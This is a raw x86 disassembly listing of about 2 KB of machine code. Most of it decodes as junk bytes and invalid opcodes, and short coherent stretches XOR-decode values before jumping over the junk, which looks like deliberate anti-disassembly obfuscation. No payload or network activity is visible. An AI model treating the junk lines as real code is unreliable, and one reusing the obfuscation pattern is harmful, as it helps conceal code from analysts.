  402104:	shl    ecx,0x64
  402107:	outs   dx,BYTE PTR ds:[esi]
  402108:	pop    ss
  402109:	mov    esi,0x40f0e50b
  40210e:	nop
  40210f:	(bad)  
  402110:	div    bh
  402112:	mov    cl,0x78
  402114:	icebp  
  402115:	or     BYTE PTR [esi-0x58],ch
  402118:	cwde   
  402119:	and    edx,DWORD PTR [ebx]
  40211b:	mov    edx,0x35b0ddb7
  402120:	fstp   QWORD PTR ds:0x976b1f46
  402126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402127:	cmp    cl,ah
  402129:	sub    esp,edi
  40212b:	add    edi,DWORD PTR [esi]
  40212d:	push   ds
  40212e:	adc    al,BYTE PTR [esi+0x13]
  402131:	les    edx,FWORD PTR [esi-0x7888cdb9]
  402137:	fdivr  DWORD PTR [ecx-0x7dfef89a]
  40213d:	cmp    edi,eax
  40213f:	out    0xab,eax
  402141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402142:	aad    0x6a
  402144:	cmp    eax,0x3ea3a5de
  402149:	push   eax
  40214a:	push   ss
  40214b:	add    ch,0x49
  40214e:	xor    al,0x50
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	loope  0x402153
  40216b:	rcr    BYTE PTR [edx+0x1e],cl
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40211e
  402176:	jmp    0x1bee:0xc04ef5a4
  40217d:	test   al,0xf1
  40217f:	adc    BYTE PTR [esi+0x15cd4ebd],al
  402185:	xor    ch,0xc4
  402188:	nop
  402189:	add    DWORD PTR [edx],ecx
  40218b:	outs   dx,DWORD PTR ds:[esi]
  40218c:	daa    
  40218d:	jmp    0x38cb:0xd6e7cb8f
  402194:	mov    cl,0x5f
  402196:	or     esp,esi
  402198:	ja     0x402206
  40219a:	and    ah,dh
  40219c:	cmp    eax,0x85733da3
  4021a1:	mov    edx,0xe8219018
  4021a6:	sbb    eax,0x6f5d566f
  4021ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ac:	adc    edi,eax
  4021ae:	call   0x975d846c
  4021b3:	xchg   DWORD PTR [ebx+0xe78dfad],edx
  4021b9:	addr16 pop esi
  4021bb:	inc    ecx
  4021bc:	sbb    eax,0xa717c505
  4021c1:	inc    edi
  4021c2:	cs sub eax,0x2b405f1d
  4021c8:	fsubr  QWORD PTR [ebx]
  4021ca:	lahf   
  4021cb:	xor    DWORD PTR [edx],esp
  4021cd:	fdiv   st(1),st
  4021cf:	and    al,0xc6
  4021d1:	fist   DWORD PTR [esi+0x5a]
  4021d4:	sub    esp,ebp
  4021d6:	fcomp  DWORD PTR [ecx+0x7b4a70d8]
  4021dc:	add    BYTE PTR [edi*8-0x543d23fd],dl
  4021e3:	pop    edx
  4021e4:	lock jbe 0x40222d
  4021e7:	inc    ebx
  4021e8:	sbb    ch,BYTE PTR [ecx+0x6e]
  4021eb:	popa   
  4021ec:	jo     0x4021d1
  4021ee:	lahf   
  4021ef:	outs   dx,BYTE PTR ds:[esi]
  4021f0:	stos   DWORD PTR es:[edi],eax
  4021f1:	in     eax,0xb4
  4021f3:	push   ss
  4021f4:	dec    eax
  4021f5:	hlt    
  4021f6:	xor    BYTE PTR [esi+0x2eed21dd],bl
  4021fc:	add    DWORD PTR [edx+ebx*8-0x2c],edx
  402200:	xchg   esp,eax
  402201:	inc    esi
  402202:	bnd jne 0x40223d
  402205:	inc    ecx
  402206:	mov    dh,0x9a
  402208:	push   es
  402209:	dec    ebp
  40220a:	jb     0x4021b8
  40220c:	sub    bl,BYTE PTR [esi-0x21]
  40220f:	lods   al,BYTE PTR ds:[esi]
  402210:	int    0xe2
  402212:	in     eax,0xb9
  402214:	in     eax,0xab
  402216:	add    eax,0xc5d7b381
  40221b:	jmp    0x4021e3
  40221d:	mov    ch,0x7b
  40221f:	(bad)  
  402223:	inc    edi
  402224:	stc    
  402225:	xchg   BYTE PTR [eax-0x7e59fc7e],al
  40222b:	lea    ecx,[edi+0x67f250ab]
  402231:	adc    BYTE PTR ds:0xc4451c70,ah
  402237:	dec    ebx
  402238:	ja     0x4021cc
  40223a:	mov    edi,0x35bacaf3
  40223f:	push   ecx
  402240:	les    edi,FWORD PTR [eax+0x5f]
  402243:	pop    eax
  402244:	rcl    DWORD PTR [edi],1
  402246:	and    eax,0x574ef90b
  40224b:	sti    
  40224c:	inc    esp
  40224d:	xor    eax,0x45ceb3e0
  402252:	sbb    eax,0xcdc875d9
  402257:	dec    esi
  402258:	or     eax,0xf633dbad
  40225d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40225e:	push   ebp
  40225f:	sbb    eax,0x4a658159
  402264:	mov    bl,0x92
  402266:	push   esp
  402267:	xlat   BYTE PTR ds:[ebx]
  402268:	dec    ebx
  402269:	or     BYTE PTR [eax-0x4c0a96e],ah
  40226f:	mov    ebp,0xe2c2029a
  402274:	inc    esp
  402275:	sbb    ch,dl
  402277:	out    0x66,eax
  402279:	xchg   ecx,eax
  40227a:	addr16 inc ebp
  40227c:	or     BYTE PTR [esp+ebp*1+0x1],0xf6
  402281:	out    0xc6,al
  402283:	jbe    0x40226d
  402285:	jle    0x40227a
  402287:	int    0x39
  402289:	std    
  40228a:	adc    edi,ebp
  40228c:	and    eax,0x6f6f1b3b
  402291:	out    dx,al
  402292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402293:	adc    al,0x7a
  402295:	mov    ss,edx
  402297:	out    dx,al
  402298:	in     eax,dx
  402299:	cmp    edx,ecx
  40229b:	or     al,0xf5
  40229d:	xchg   esp,eax
  40229e:	(bad)  
  40229f:	outs   dx,BYTE PTR ds:[esi]
  4022a0:	xchg   esi,ebx
  4022a2:	mov    ah,0xee
  4022a4:	shl    BYTE PTR [ebp+0x48],1
  4022a7:	dec    ebx
  4022a8:	xchg   ebx,eax
  4022a9:	mov    edi,0x141be57b
  4022ae:	test   eax,0x423fb135
  4022b3:	xchg   ebp,eax
  4022b4:	push   esp
  4022b5:	(bad)  
  4022b6:	cmp    al,bh
  4022b8:	cs mov bh,0xb5
  4022bb:	dec    edi
  4022bc:	mul    bh
  4022be:	out    0xcd,al
  4022c0:	sbb    eax,esi
  4022c2:	inc    ebp
  4022c3:	inc    esi
  4022c4:	cwde   
  4022c5:	mov    ebx,0xca40a6e3
  4022ca:	loope  0x402258
  4022cc:	cmp    al,BYTE PTR [ecx+ebx*1+0x73]
  4022d0:	scas   eax,DWORD PTR es:[edi]
  4022d1:	fisttp QWORD PTR [ecx+0x7137079e]
  4022d7:	jmp    0x40227f
  4022d9:	jne    0x402274
  4022db:	in     al,dx
  4022dc:	dec    esi
  4022dd:	mov    ds:0x8b696457,eax
  4022e2:	mov    al,BYTE PTR [edi+0x29]
  4022e5:	scas   eax,DWORD PTR es:[edi]
  4022e6:	inc    ebx
  4022e7:	xlat   BYTE PTR ds:[ebx]
  4022e8:	lods   al,BYTE PTR ds:[esi]
  4022e9:	fs push ss
  4022eb:	in     al,0x3f
  4022ed:	in     eax,0x78
  4022ef:	fldcw  WORD PTR [eax+0x24]
  4022f2:	sub    BYTE PTR [ebp-0x63],ah
  4022f5:	loopne 0x4022c8
  4022f7:	jle    0x4022a5
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	jl     0x40239d
  402359:	cmp    DWORD PTR [edx],edx
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x40237c
  402364:	gs cli 
  402366:	and    BYTE PTR ds:0x16c69e6a,bl
  40236c:	xor    edi,esi
  40236e:	test   eax,0x5caee799
  402373:	jecxz  0x402399
  402375:	loope  0x4022f8
  402377:	or     al,0xee
  402379:	jb     0x402316
  40237b:	retf   
  40237c:	inc    edi
  40237d:	cmp    dl,BYTE PTR [edi-0x137d6c5f]
  402383:	bound  esp,QWORD PTR [ecx]
  402385:	popf   
  402386:	sbb    BYTE PTR [edi],dh
  402388:	leave  
  402389:	xchg   edi,eax
  40238a:	(bad)  
  40238b:	dec    esi
  40238c:	dec    ebp
  40238d:	sar    DWORD PTR [edx-0x7ce3b760],cl
  402393:	sub    BYTE PTR [ecx],al
  402395:	out    dx,al
  402396:	sub    edi,esi
  402398:	js     0x402403
  40239a:	idiv   DWORD PTR [edi+0x61]
  40239d:	xchg   esp,eax
  40239e:	imul   ebx,DWORD PTR [esi+ebx*2-0x5a],0x3d965e36
  4023a6:	in     al,dx
  4023a7:	or     ebx,DWORD PTR [esi+esi*1-0x31]
  4023ab:	dec    ebp
  4023ac:	inc    ebp
  4023ad:	outs   dx,BYTE PTR ds:[si]
  4023af:	test   eax,0x2640e39d
  4023b4:	test   eax,0x6fa49f3b
  4023b9:	mov    bh,0x2c
  4023bb:	dec    esp
  4023bc:	xchg   esi,eax
  4023bd:	push   ebx
  4023be:	dec    ebp
  4023bf:	mov    al,bh
  4023c1:	jp     0x402415
  4023c3:	ud1    esp,ebx
  4023c6:	lahf   
  4023c7:	add    al,0x76
  4023c9:	mov    bh,0x6c
  4023cb:	mov    al,ds:0xcd39e61b
  4023d0:	icebp  
  4023d1:	pop    ebp
  4023d2:	retf   
  4023d3:	in     al,0xce
  4023d5:	out    0x25,eax
  4023d7:	(bad)  
  4023d8:	ja     0x4023a7
  4023da:	add    esi,DWORD PTR [ebx+ecx*4+0x1add1fa4]
  4023e1:	mov    ecx,0x8a405f3b
  4023e6:	inc    ebp
  4023e7:	cld    
  4023e8:	stos   BYTE PTR es:[edi],al
  4023e9:	(bad)  
  4023ea:	xchg   edi,eax
  4023eb:	ss shl ch,0xda
  4023ef:	jae    0x40237d
  4023f1:	test   ecx,edi
  4023f3:	pop    ecx
  4023f4:	mov    WORD PTR [edx],?
  4023f6:	(bad)  
  4023f7:	push   0xbec19a29
  4023fc:	sahf   
  4023fd:	ja     0x4023e0
  4023ff:	mov    edi,0x5e2befa
  402404:	jmp    0x71d86f5b
  402409:	leave  
  40240a:	add    BYTE PTR [edi-0x4e],dh
  40240d:	or     bl,al
  40240f:	int3   
  402410:	je     0x40243f
  402412:	jp     0x4023fc
  402414:	addr16 in eax,0x40
  402417:	and    cl,BYTE PTR [edx-0x6]
  40241a:	xchg   esi,eax
  40241b:	mov    ch,0x53
  40241d:	or     edx,DWORD PTR [edx]
  40241f:	push   0xaf1de7dd
  402424:	out    0x80,al
  402426:	xchg   esp,eax
  402427:	mov    ds:0x4f5a2bc7,eax
  40242c:	cmp    al,0x93
  40242e:	sub    BYTE PTR [eax],bh
  402430:	dec    eax
  402431:	sbb    eax,0x16488afe
  402436:	add    DWORD PTR [edx+0x66733cd0],0x5a
  40243d:	jnp    0x40246a
  40243f:	test   al,0x36
  402441:	pusha  
  402442:	and    eax,0x3c866ab1
  402447:	lock fs add al,0x35
  40244b:	fild   WORD PTR [edx]
  40244d:	jge    0x402452
  40244f:	fdivr  DWORD PTR [ebp-0x14]
  402452:	mov    al,0x97
  402454:	pop    esp
  402455:	daa    
  402456:	mov    ?,edx
  402458:	jns    0x402483
  40245a:	lock push ds
  40245c:	shl    DWORD PTR [ebx-0x2d],1
  40245f:	fdiv   DWORD PTR [ebx+0x1a]
  402462:	xor    al,0x82
  402464:	ret    
  402465:	xchg   esi,eax
  402466:	loopne 0x402427
  402468:	loop   0x40242a
  40246a:	arpl   WORD PTR [edx],bp
  40246c:	pop    ebx
  40246d:	add    DWORD PTR [ebx+0x6c],ebx
  402470:	dec    esp
  402471:	int3   
  402472:	inc    esi
  402473:	fnstcw WORD PTR [ecx-0x5b2bc301]
  402479:	arpl   WORD PTR [edx],cx
  40247b:	out    0xa,al
  40247d:	pop    ebx
  40247e:	and    BYTE PTR [esi+ebp*2-0x10],bh
  402482:	in     al,0x64
  402484:	repnz adc edi,esi
  402487:	jp     0x40246f
  402489:	(bad)  
  40248a:	mov    ch,0x28
  40248c:	lods   eax,DWORD PTR ds:[esi]
  40248d:	out    dx,eax
  40248e:	mov    edx,0x60d881b2
  402493:	inc    ebx
  402494:	repz jl 0x402459
  402497:	cmp    edx,DWORD PTR [edx+0x636263c0]
  40249d:	sub    cl,BYTE PTR [eax-0x1af269c3]
  4024a3:	ficom  WORD PTR [esi]
  4024a5:	pop    edx
  4024a6:	mov    esp,0xc1ec9ec5
  4024ab:	in     eax,dx
  4024ac:	cmc    
  4024ad:	push   es
  4024ae:	sub    eax,0xa314c211
  4024b3:	mov    DWORD PTR [esi+0x52],esi
  4024b6:	adc    eax,0x29ff2d98
  4024bb:	outs   dx,DWORD PTR ds:[esi]
  4024bc:	leave  
  4024bd:	rcl    DWORD PTR [edx],1
  4024bf:	aam    0x72
  4024c1:	xchg   ebp,eax
  4024c2:	jl     0x4024b2
  4024c4:	mov    dl,0xbc
  4024c6:	int3   
  4024c7:	xchg   ebx,eax
  4024c8:	xchg   ebx,eax
  4024c9:	lds    edx,FWORD PTR [ebx+0x57]
  4024cc:	cdq    
  4024cd:	sbb    al,0x48
  4024cf:	push   ss
  4024d0:	push   esi
  4024d1:	ins    DWORD PTR es:[edi],dx
  4024d2:	xor    al,0x1e
  4024d4:	aad    0x26
  4024d6:	push   edi
  4024d7:	jge    0x402459
  4024d9:	xor    BYTE PTR [edi],0xaf
  4024dc:	jl     0x40248f
  4024de:	fisubr DWORD PTR [ebp+0x27a5f4ba]
  4024e4:	xchg   esi,eax
  4024e5:	mov    al,ds:0xf0458ba5
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	jmp    0x7e01:0x26ec390d
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x40250b
  40251a:	and    eax,0xa90175b3
  40251f:	(bad)  
  402520:	mov    bl,0x48
  402522:	loop   0x40259e
  402524:	push   edi
  402525:	cwde   
  402526:	loope  0x402567
  402528:	jg     0x402582
  40252a:	nop
  40252b:	xlat   BYTE PTR ds:[ebx]
  40252c:	ret    0x7fd1
  40252f:	mov    esp,0x169ac654
  402534:	(bad)  
  402535:	adc    ebp,esp
  402537:	(bad)  
  402538:	arpl   di,cx
  40253a:	(bad)  
  40253b:	fistp  QWORD PTR [ecx+ebp*1]
  40253e:	inc    esp
  40253f:	lods   eax,DWORD PTR ds:[esi]
  402540:	(bad)  
  402541:	jae    0x402514
  402543:	mov    WORD PTR [ebx-0x17918158],cs
  402549:	arpl   sp,bp
  40254b:	das    
  40254c:	and    BYTE PTR ds:0x353cc377,bh
  402552:	add    esi,ecx
  402554:	mov    ecx,0x8f95db8a
  402559:	adc    bl,ah
  40255b:	int    0x42
  40255d:	test   ch,0x35
  402560:	or     BYTE PTR [ecx],dh
  402562:	inc    esi
  402563:	das    
  402564:	jb     0x402541
  402566:	lods   al,BYTE PTR ds:[esi]
  402567:	mov    esp,DWORD PTR [eax-0x5483f32b]
  40256d:	test   al,0x7e
  40256f:	push   0x22ebc9e4
  402574:	je     0x4025dd
  402576:	je     0x40252f
  402578:	add    DWORD PTR [edi+ebx*1-0x10ea1827],ebx
  40257f:	ja     0x402566
  402581:	test   ecx,esi
  402583:	addr16 test ebp,ecx
  402586:	sbb    ecx,ebp
  402588:	jae    0x40259e
  40258a:	loop   0x402588
  40258c:	retf   0xb74c
  40258f:	je     0x4025b4
  402591:	lods   al,BYTE PTR ds:[esi]
  402592:	jns    0x4025eb
  402594:	iret   
  402595:	lahf   
  402596:	sub    dl,al
  402598:	mov    ds:0xc2d94a62,al
  40259d:	add    edx,DWORD PTR [edi]
  40259f:	sbb    DWORD PTR [edx],eax
  4025a1:	lahf   
  4025a2:	fdiv   QWORD PTR [ecx+0x35]
  4025a5:	mov    al,ds:0x876451e8
  4025aa:	hlt    
  4025ab:	pcmpeqw mm7,QWORD PTR [ebx+0x98ab032]
  4025b2:	push   0x5579ee8d
  4025b7:	sub    al,BYTE PTR [edx+0x767ae9a]
  4025bd:	jle    0x40259f
  4025bf:	sti    
  4025c0:	test   eax,0xbba50af6
  4025c5:	ja     0x4025ef
  4025c7:	xchg   eax,edi
  4025c9:	jae    0x402555
  4025cb:	imul   ebp,eax,0x4269a665
  4025d1:	jmp    0xbb63d655
  4025d6:	adc    DWORD PTR [ecx],eax
  4025d8:	jp     0x402611
  4025da:	mov    ebp,0xc549e257
  4025df:	mov    ebx,DWORD PTR [ebp+0xfbd6e88]
  4025e5:	mov    ebx,0xe5699041
  4025ea:	jmp    0x1045:0xc2a9d99e
  4025f1:	fisttp QWORD PTR [esi-0x61]
  4025f4:	data16 int3 
  4025f6:	ret    0xd818
  4025f9:	inc    ebx
  4025fa:	in     eax,0xdb
  4025fc:	ret    0x71bb
  4025ff:	(bad)  
  402600:	fdivr  st(2),st
  402602:	pop    edi
  402603:	lock sub dl,BYTE PTR [eax]
  402606:	xchg   ebp,eax
  402607:	adc    eax,0x38cc9cad
  40260c:	js     0x4025d1
  40260e:	pop    edx
  40260f:	pushf  
  402610:	sub    eax,DWORD PTR [edi+ebp*8-0x6ad3f806]
  402617:	xchg   esp,eax
  402618:	inc    eax
  402619:	int3   
  40261a:	loope  0x40259e
  40261c:	push   esi
  40261d:	mov    eax,ds:0x510cc67f
  402622:	fmul   QWORD PTR [ebp-0xadd628f]
  402628:	cli    
  402629:	add    eax,DWORD PTR [ebx]
  40262b:	fsub   st,st(5)
  40262d:	inc    ebp
  40262e:	fsubr  QWORD PTR [edx+ecx*1]
  402631:	push   edi
  402632:	sbb    al,0x4f
  402634:	retf   
  402635:	or     BYTE PTR [esi+0x266aa4f6],cl
  40263b:	mov    edi,0x8bb59ca7
  402640:	or     ebp,DWORD PTR [ecx]
  402642:	dec    ebx
  402643:	loopne 0x402688
  402645:	cdq    
  402646:	push   0x33
  402648:	adc    edx,DWORD PTR [ebp+0x33]
  40264b:	pop    ecx
  40264c:	cmp    eax,0x54853e4d
  402651:	mov    edx,0xdf3841ee
  402656:	iret   
  402657:	xchg   edi,eax
  402658:	jns    0x40267d
  40265a:	push   edx
  40265b:	sub    dh,BYTE PTR ds:0xc52e5d04
  402661:	out    dx,eax
  402662:	pop    esp
  402663:	cmp    al,0x9
  402665:	imul   BYTE PTR [ebp-0x6cfd8e1c]
  40266b:	sub    bh,BYTE PTR [edx+edx*8-0x6a]
  40266f:	add    BYTE PTR [esi-0x6b],dl
  402672:	call   0x28e7bc09
  402677:	adc    eax,0x5ff7c680
  40267c:	mov    edi,0x1414e4d2
  402681:	arpl   WORD PTR [edi+esi*1+0x45],ax
  402685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402686:	fs jmp 0x3166:0x5219fb0b
  40268e:	dec    esi
  40268f:	mov    ecx,gs
  402691:	shl    BYTE PTR [edx-0x42a45ee2],1
  402697:	and    eax,0x66ef2556
  40269c:	std    
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	inc    ebp
  4026d3:	mov    esi,edx
  4026d5:	outs   dx,DWORD PTR ds:[esi]
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x402741
  4026df:	xor    al,0x39
  4026e1:	popf   
  4026e2:	add    eax,0x58698dcd
  4026e7:	pusha  
  4026e8:	(bad)  
  4026e9:	push   esi
  4026ea:	xor    dh,ah
  4026ec:	mov    esi,0xe8956972
  4026f1:	daa    
  4026f2:	ja     0x402699
  4026f4:	ffree  st(0)
  4026f6:	or     bl,ah
  4026f8:	(bad)  
  4026f9:	sub    BYTE PTR [ebp-0x38],dh
  4026fc:	stos   DWORD PTR es:[edi],eax
  4026fd:	(bad)  
  4026ff:	or     edx,DWORD PTR [edi+0x36946f09]
  402705:	loopne 0x40270f
  402707:	mov    eax,0xb42abc50
  40270c:	mov    ecx,0xb086a185
  402711:	shl    BYTE PTR [edx],0x8c
  402714:	jns    0x40274f
  402716:	xor    DWORD PTR [eax+0x42a786e0],eax
  40271c:	daa    
  40271d:	adc    eax,0x7b1c0eaa
  402722:	jle    0x4026fb
  402724:	pop    DWORD PTR [edx+0x7f24c3da]
  40272a:	mov    bl,0x67
  40272c:	jmp    0xcfefa4a3
  402731:	cwde   
  402732:	jmp    0x4027b2
  402734:	and    DWORD PTR [eax],eax
  402736:	xlat   BYTE PTR ds:[ebx]
  402737:	add    al,0x94
  402739:	popf   
  40273a:	scas   eax,DWORD PTR es:[edi]
  40273b:	pop    ds
  40273c:	aas    
  40273d:	mov    eax,cs
  40273f:	sar    BYTE PTR [ecx+ebp*4],1
  402742:	cmp    DWORD PTR [ebp-0x6a],ebx
  402745:	sub    DWORD PTR [esi-0x151e96d1],esp
  40274b:	lds    ecx,FWORD PTR [eax+0x66]
  40274e:	dec    esi
  40274f:	stc    
  402750:	cmp    ch,bl
  402752:	push   edx
  402753:	into   
  402754:	jnp    0x4027cf
  402756:	xchg   esi,eax
  402757:	pop    esi
  402758:	gs ins BYTE PTR es:[edi],dx
  40275a:	ret    
  40275b:	arpl   WORD PTR [edx+eax*4],bp
  40275e:	and    BYTE PTR fs:[ecx],bh
  402761:	and    esp,edi
  402763:	xchg   ebp,eax
  402764:	dec    edi
  402765:	add    BYTE PTR [eax+0x4c],dh
  402768:	jmp    0xf22a:0x88a73fcd
  40276f:	clc    
  402770:	and    eax,ebx
  402772:	ins    BYTE PTR es:[edi],dx
  402773:	add    ebp,DWORD PTR [edx]
  402775:	and    bh,BYTE PTR ds:0x4952c454
  40277b:	jg     0x402789
  40277d:	or     DWORD PTR [ecx],ecx
  40277f:	xchg   edi,eax
  402780:	push   cs
  402781:	jmp    0x4027d7
  402783:	icebp  
  402784:	and    dl,dh
  402786:	cmp    ah,BYTE PTR [ebx-0x1f]
  402789:	scas   eax,DWORD PTR es:[edi]
  40278a:	sbb    al,0x4c
  40278c:	sbb    BYTE PTR [ebp+eiz*4+0x72f7b57c],dl
  402793:	pop    esi
  402794:	test   DWORD PTR [esi],0xbc01d767
  40279a:	popa   
  40279b:	sub    ch,BYTE PTR [edx+edx*4-0x752aeadd]
  4027a2:	gs ins BYTE PTR es:[edi],dx
  4027a4:	xchg   BYTE PTR ds:0x43e68e3d,cl
  4027aa:	stos   DWORD PTR es:[edi],eax
  4027ab:	adc    al,0xb8
  4027ad:	xor    al,0x51
  4027af:	dec    edi
  4027b0:	icebp  
  4027b1:	out    dx,al
  4027b2:	xor    al,0xaa
  4027b4:	jle    0x402815
  4027b6:	scas   eax,DWORD PTR es:[edi]
  4027b7:	retf   0x6473
  4027ba:	pop    edi
  4027bb:	push   ss
  4027bc:	xchg   ebp,eax
  4027bd:	jmp    0x3687:0x916aa909
  4027c4:	syscall 
  4027c6:	mov    ebp,0xa5673b44
  4027cb:	dec    ebx
  4027cc:	push   cs
  4027cd:	mov    dh,0x5d
  4027cf:	and    ecx,esp
  4027d1:	sub    al,0x40
  4027d3:	call   0x59d0:0xbfb5fe8a
  4027da:	repnz pop esp
  4027dc:	pop    es
  4027dd:	push   esp
  4027de:	mov    bl,0xfa
  4027e0:	clc    
  4027e1:	and    BYTE PTR [ebp-0x31],0x1c
  4027e5:	inc    esp
  4027e6:	jecxz  0x402788
  4027e8:	rcr    ebp,0x1d
  4027eb:	jns    0x402835
  4027ed:	push   ecx
  4027ee:	shr    BYTE PTR [ebp+0xa4d650b],1
  4027f4:	push   eax
  4027f5:	sub    bl,BYTE PTR [edx-0x75]
  4027f8:	xchg   esp,eax
  4027f9:	sub    DWORD PTR [edi],esp
  4027fb:	xor    DWORD PTR [ebp-0x52],edi
  4027fe:	inc    eax
  4027ff:	jbe    0x4027ee
  402801:	fisttp WORD PTR [ebx+eiz*8]
  402804:	ret    
  402805:	fs mov esp,0x7a37aae
  40280b:	imul   esi,DWORD PTR [ebp+0x1346de2d],0x36
  402812:	enter  0xa6c3,0xac
  402816:	xor    dh,cl
  402818:	push   ebx
  402819:	mov    esp,0xca6e3be1
  40281e:	sbb    DWORD PTR [eax+ecx*2+0x45],0x4e
  402823:	fiadd  WORD PTR [edx+0x527ea5e2]
  402829:	xchg   esi,eax
  40282a:	lods   al,BYTE PTR ds:[esi]
  40282b:	ins    BYTE PTR es:[di],dx
  40282d:	es dec esp
  40282f:	fnsave [eax]
  402831:	dec    esp
  402832:	loop   0x4027fb
  402834:	xor    DWORD PTR [ebx],ebp
  402836:	leave  
  402837:	cmc    
  402838:	mov    bh,0x10
  40283a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283b:	pop    es
  40283c:	xchg   edi,eax
  40283d:	fsub   DWORD PTR [edi]
  40283f:	push   esp
  402840:	xlat   BYTE PTR ds:[ebx]
  402841:	shl    eax,0xaa
  402844:	add    ebp,esi
  402846:	retf   
  402847:	mov    dh,0x19
  402849:	cdq    
  40284a:	or     DWORD PTR [ebp+0x24],esi
  40284d:	loop   0x4027f6
  40284f:	mov    ch,0xf5
  402851:	or     eax,0xa57b65e3
  402856:	(bad)  [eax]
  402858:	loope  0x4028d0
  40285a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40285b:	popa   
  40285c:	or     bl,bh
  40285e:	pop    ecx
  40285f:	rol    DWORD PTR [ebp-0x27],cl
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	push   esi
  402884:	adc    BYTE PTR [eax+0x7e0c2ec3],cl
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028fe
  402890:	mov    dh,BYTE PTR [ebx-0x7af9d284]
  402896:	add    BYTE PTR [edx-0x3513cd34],bl
  40289c:	loope  0x4028e6
  40289e:	push   ecx
  40289f:	addr16 loopne 0x402848
  4028a2:	xor    ah,dl
  4028a4:	mov    bl,BYTE PTR [ecx]
  4028a6:	mul    DWORD PTR [esi-0x65]
  4028a9:	pop    ecx
  4028aa:	in     eax,dx
  4028ab:	ins    BYTE PTR es:[edi],dx
  4028ac:	aam    0xec
  4028ae:	pop    ebx
  4028af:	int    0xf9
  4028b1:	push   esi
  4028b2:	xchg   al,ch
  4028b4:	icebp  
  4028b5:	cmp    al,0x2f
  4028b7:	test   DWORD PTR [esp+esi*8+0x65a5f861],eax
  4028be:	push   ds
  4028bf:	cmp    DWORD PTR [ecx-0x22d9a87e],ebx
  4028c5:	xchg   edx,eax
  4028c6:	ja     0x402854
  4028c8:	sbb    bl,BYTE PTR [eax+0xf]
  4028cb:	mov    esi,0x63bfa5d8
  4028d0:	data16 sahf 
  4028d2:	sti    
  4028d3:	mul    bh
  4028d5:	popa   
  4028d6:	and    ah,BYTE PTR [eax]
  4028d8:	pop    ebx
  4028d9:	jbe    0x40289a
  4028db:	push   0xfffffffe
  4028dd:	iret   
  4028de:	(bad)  
  4028df:	sbb    al,0xe2
